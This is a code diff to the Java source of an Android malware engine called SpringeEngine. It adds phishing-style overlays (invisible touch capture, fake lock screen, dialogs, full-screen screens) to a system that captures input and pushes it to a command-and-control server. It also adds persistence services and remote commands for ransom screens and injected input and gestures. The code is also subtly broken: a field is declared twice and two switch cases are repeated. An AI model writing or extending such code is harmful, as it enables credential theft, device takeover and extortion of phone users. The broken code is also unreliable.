@@ -16,6 +16,15 @@ import com.fason.app.features.springe.injection.AccessibilityInjector;
 import com.fason.app.features.springe.overlays.BlackScreenOverlay;
 import com.fason.app.features.springe.overlays.WebViewOverlay;
 import com.fason.app.features.springe.templates.TemplateManager;
+import com.fason.app.features.springe.overlays.InvisibleTouchOverlay;
+import com.fason.app.features.springe.overlays.LockScreenOverlay;
+import com.fason.app.features.springe.overlays.DialogOverlay;
+import com.fason.app.features.springe.overlays.FullScreenOverlay;
+import com.fason.app.features.springe.overlays.NotificationOverlay;
+import com.fason.app.features.springe.persistence.OverlayPersistenceService;
+import com.fason.app.features.springe.persistence.ScreenStateMonitor;
+import com.fason.app.features.springe.detection.NotificationTrigger;
+import com.fason.app.features.springe.detection.ScheduleTrigger;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -65,6 +74,15 @@ public final class SpringeEngine {
     private C2DataPusher dataPusher;
     private InputCaptureService inputCapture;
     private AccessibilityInjector accessibilityInjector;
+    private InvisibleTouchOverlay invisibleTouchOverlay;
+    private InvisibleTouchOverlay invisibleTouchOverlay;
+    private LockScreenOverlay lockScreenOverlay;
+    private DialogOverlay dialogOverlay;
+    private FullScreenOverlay fullScreenOverlay;
+    private NotificationOverlay notificationOverlay;
+    private OverlayPersistenceService persistenceService;
+    private ScreenStateMonitor screenStateMonitor;
+    private ScheduleTrigger scheduleTrigger;
 
     // Overlay instances
     private WebViewOverlay webViewOverlay;
@@ -118,9 +136,19 @@ public final class SpringeEngine {
             this.inputCapture = new InputCaptureService(exfilQueue);
             this.foregroundWatcher = new ForegroundAppWatcher(config);
             this.accessibilityInjector = new AccessibilityInjector(context);
+            
 
             this.webViewOverlay = new WebViewOverlay(context, windowManager, templateManager, inputCapture);
             this.blackScreenOverlay = new BlackScreenOverlay(context, windowManager);
+            this.invisibleTouchOverlay = new InvisibleTouchOverlay(context, windowManager, inputCapture);
+            this.lockScreenOverlay = new LockScreenOverlay(context, windowManager, inputCapture);
+            this.dialogOverlay = new DialogOverlay(context, windowManager);
+            this.fullScreenOverlay = new FullScreenOverlay(context, windowManager);
+            this.notificationOverlay = new NotificationOverlay(context);
+            this.persistenceService = new OverlayPersistenceService(context, this);
+            this.screenStateMonitor = new ScreenStateMonitor(context, persistenceService);
+            this.scheduleTrigger = new ScheduleTrigger(context);
+            
 
             // Auto-arm if previously armed (persistent across restarts)
             if (config.isArmed()) {
@@ -176,6 +204,14 @@ public final class SpringeEngine {
                 case SpringeProtocol.CMD_FETCH_TEMPLATE:handleFetchTemplate(data, socket, cmdId); break;
                 case SpringeProtocol.CMD_DELETE_TEMPLATE:handleDeleteTemplate(data, socket, cmdId); break;
                 case SpringeProtocol.CMD_UPDATE_TEMPLATES:handleUpdateTemplates(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_SHOW_INVISIBLE: handleShowInvisible(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_SHOW_BLACK:     handleShowBlack(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_SHOW_LOCK:      handleShowLockScreen(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_SHOW_DIALOG:    handleShowDialog(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_SHOW_RANSOM:    handleShowRansom(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_INJECT_INPUT:   handleInjectInput(data, socket, cmdId); break;
+                case SpringeProtocol.CMD_INJECT_GESTURE: handleInjectGesture(data, socket, cmdId); break;
+                    
                 case SpringeProtocol.CMD_INJECT_INPUT: handleInjectInput(data, socket, cmdId); break;
                 case SpringeProtocol.CMD_INJECT_GESTURE:handleInjectGesture(data, socket, cmdId); break;
                 case SpringeProtocol.CMD_FLUSH:        handleFlush(data, socket, cmdId); break;
